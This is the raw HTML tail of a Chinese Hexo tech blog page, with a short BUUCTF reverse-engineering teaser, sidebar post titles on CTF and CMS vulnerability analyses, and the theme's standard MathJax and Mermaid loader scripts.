class="info-item-2">【BUUCTF】REVERSE-刷题记录-reverse1</div></div><div class="info-2"><div class="info-item-1">题目信息 解题步骤 编译器为 MSVC 19.00，对应 Visual Studio 2015 或 2017 版本。 使用ida查看：  12345678for ( j = 0; ; ++j ){  v10 = j;  if ( j &gt; j_strlen(Str2) )    break;  if ( Str2[j] == 111 )    Str2[j] = 48;}  Str2 是一个字符串（全局变量或常量） 遍历 Str2，把所有字符 'o'（ASCII 111）替换成 '0'（ASCII 48） 条件是 j &gt; j_strlen(Str2) 才跳出 → 实际是 j &lt;= len 时继续 所以这是一个 字符串预处理：将 Str2 中的 o → 0    Str2 是“正确 flag”的模板，但被混淆了（用 o 代替 0）  12sub_1400111D1("input the flag:");sub_14001128F("%20s", Str1);  sub_140...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=1044631097&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">末心</div><div class="author-info-description">一个关于技术的小站，分享自己的技术思考和经验。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Moxin1044"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Moxin1044" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:moxin1044@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">学而不思则罔，思而不学则殆</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.</span> <span class="toc-text">解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E5%AF%B9%E9%BD%90%E7%9A%84%E8%A6%81%E6%B1%82"><span class="toc-number">2.1.</span> <span class="toc-text">栈对齐的要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E5%AF%B9%E9%BD%90%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text">栈对齐原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">解决方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">3.</span> <span class="toc-text">补充</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E5%AF%B9%E9%BD%90%E5%AF%B9%E6%AF%94%E5%9B%BE"><span class="toc-number">3.1.</span> <span class="toc-text">栈对齐对比图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E5%B8%83%E5%B1%80%E7%A4%BA%E6%84%8F%E5%9B%BE"><span class="toc-number">3.2.</span> <span class="toc-text">栈布局示意图</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/e301/" title="【青少年CTF】PWN-刷题记录-ret2fun1"><img src="/../attachments/image-20251119174331613.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【青少年CTF】PWN-刷题记录-ret2fun1"></a><div class="content"><a class="title" href="/posts/e301/" title="【青少年CTF】PWN-刷题记录-ret2fun1">【青少年CTF】PWN-刷题记录-ret2fun1</a><time datetime="2025-11-19T09:07:08.000Z" title="发表于 2025-11-19 17:07:08">2025-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e8b8/" title="【漏洞分析】GetSimple-CMS-远程命令执行（CVE-2019-11231）"><img src="/../attachments/image-20251118142129310.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【漏洞分析】GetSimple-CMS-远程命令执行（CVE-2019-11231）"></a><div class="content"><a class="title" href="/posts/e8b8/" title="【漏洞分析】GetSimple-CMS-远程命令执行（CVE-2019-11231）">【漏洞分析】GetSimple-CMS-远程命令执行（CVE-2019-11231）</a><time datetime="2025-11-18T05:06:20.000Z" title="发表于 2025-11-18 13:06:20">2025-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8397/" title="【漏洞分析】DEDECMS-V5.7SP2-5.7.107-后台RCE漏洞"><img src="/../attachments/image-20251118124213360.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【漏洞分析】DEDECMS-V5.7SP2-5.7.107-后台RCE漏洞"></a><div class="content"><a class="title" href="/posts/8397/" title="【漏洞分析】DEDECMS-V5.7SP2-5.7.107-后台RCE漏洞">【漏洞分析】DEDECMS-V5.7SP2-5.7.107-后台RCE漏洞</a><time datetime="2025-11-18T03:32:08.000Z" title="发表于 2025-11-18 11:32:08">2025-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d5a3/" title="【漏洞分析】74CMS-骑士CMSV5.0.1后台远程代码执行漏洞分析"><img src="/../attachments/image-20251118110503633.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【漏洞分析】74CMS-骑士CMSV5.0.1后台远程代码执行漏洞分析"></a><div class="content"><a class="title" href="/posts/d5a3/" title="【漏洞分析】74CMS-骑士CMSV5.0.1后台远程代码执行漏洞分析">【漏洞分析】74CMS-骑士CMSV5.0.1后台远程代码执行漏洞分析</a><time datetime="2025-11-18T02:53:14.000Z" title="发表于 2025-11-18 10:53:14">2025-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d051/" title="【漏洞分析】SeaCMS_海洋CMS_V11 - 12.5后台代码执行漏洞"><img src="/../attachments/image-20251117101944835.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【漏洞分析】SeaCMS_海洋CMS_V11 - 12.5后台代码执行漏洞"></a><div class="content"><a class="title" href="/posts/d051/" title="【漏洞分析】SeaCMS_海洋CMS_V11 - 12.5后台代码执行漏洞">【漏洞分析】SeaCMS_海洋CMS_V11 - 12.5后台代码执行漏洞</a><time datetime="2025-11-17T02:10:36.000Z" title="发表于 2025-11-17 10:10:36">2025-11-17</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©&nbsp;2020 - 2025 By 末心</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div><div class="footer_custom_text"><p>学如逆水行舟，不进则退。</p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.0.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"></div><hr><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.1"></script></div></div></body></html>
